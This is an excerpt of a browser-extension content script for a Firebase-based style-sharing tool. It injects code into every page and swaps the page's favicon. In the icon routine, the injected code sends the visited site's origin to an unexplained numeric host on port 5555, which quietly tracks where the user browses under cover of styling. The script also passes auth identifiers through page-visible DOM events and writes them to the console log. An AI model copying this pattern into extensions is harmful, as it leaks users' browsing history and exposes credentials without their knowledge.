...
function getIconScript(styleApplied) {
	return `(function(){
	console.time("Style apply");
	var styleApplied = ${styleApplied};
	var GetImage = (function() {
		var imageCache = window.imageCache = window.imageCache || {};
	...
	function getDataUrl(url, callback) {
		var dataUrlCache = window.dataUrlCache = window.dataUrlCache || {};
		if(dataUrlCache[url]) {
			callback(dataUrlCache[url]);
			return;
		} 
		var req = new XMLHttpRequest();
		req.addEventListener("load", function() {
			dataUrlCache[url] = req.responseText; 
	...
	var getIconUrl = "https://104236137119.com:5555/" + encodeURIComponent(document.location.origin);
	getDataUrl(getIconUrl, function(dataUrl) {
		GetImage(dataUrl, function(image) {
			...
			if(styleApplied) {
				for(var ix = 0; ix < imageData.data.length; ix++) {
					imageData.data[ix] += 200;
				}
			}
	
			context.putImageData(imageData, 0, 0);
	
			var previousFavicons = document.querySelectorAll("[rel~='icon']");
			for(var iz = 0; iz < previousFavicons.length; iz++) {
				previousFavicons[iz].remove();
			}
			var favicon = document.createElement("link");
			favicon.id = "favicon";
			favicon.type = "image/x-icon";
			favicon.rel = "shortcut icon";
			var newDataUrl = canvas.toDataURL("image/x-icon");
			favicon.href = newDataUrl;
	
			console.timeEnd("Style apply");
...
function setIcon() {
	...
	script.innerText = getIconScript(true);
	document.head.appendChild(script);
}
function unsetIcon() {
	var script = document.createElement("script");
	script.type = "text/javascript";
	script.innerText = getIconScript(false);
	document.head.appendChild(script);
}
...
function whenFirebaseLoads() {
	var ref = new Firebase("https://stylish-share.firebaseio.com/");
	
	//chrome.extension.sendMessage({method: "getAuth"}, setAuth);
	...
	function readEnabledName(urlsSnapshot) {
		...
		if(!enabledIDs[styleID]) return;
		var urlsObj = urlsSnapshot.val();
		
		var urls = [];
		//Check if any apply to us
		var apply = false;
		for(var key in urlsObj) {
			var url = urlsObj[key];
			console.log("Maybe " + url);
			if(new RegExp(url).exec(document.location.href.toString())) {
				apply = true;
				break;
			}
		}
		appliedIDs[styleID] = apply;
		var countApplied = 0;
		for(var key in appliedIDs) {
			var applied = appliedIDs[key];
			if(applied) {
				countApplied++;
			}
		}
	...
	function enabledDataChanged(snapshot) {
		...
		for(var styleID in enabled) {
			enabledIDs[styleID] = enabled[styleID];
	...
	function sendGetAuth() {
		var authEvent = document.createEvent("CustomEvent");
		authEvent.initCustomEvent("getAuth", true, true);
		document.dispatchEvent(authEvent);
	}
	
	var port = chrome.runtime.connect({name: "stylishChrome"});
	var bootMessage = { method: "contentBoot", time: +new Date() };
	console.log("Content booting with", bootMessage);
	port.postMessage(bootMessage);
	port.onMessage.addListener(function(message) {
		console.log("Content got message", message);
		if (message.method === "contentGetAuth") {
			sendGetAuth();
		} else if (message.method === "nonAuthContentFromAuth") {
			console.log("Got auth", message.auth);
			onAuth({uid: message.auth});
		}
	});
	
	window.addEventListener("auth", function(event){
		console.log("Content script got", event);
		port.postMessage({method: "contentFromAuth", auth: event.detail});
	});
	sendGetAuth();
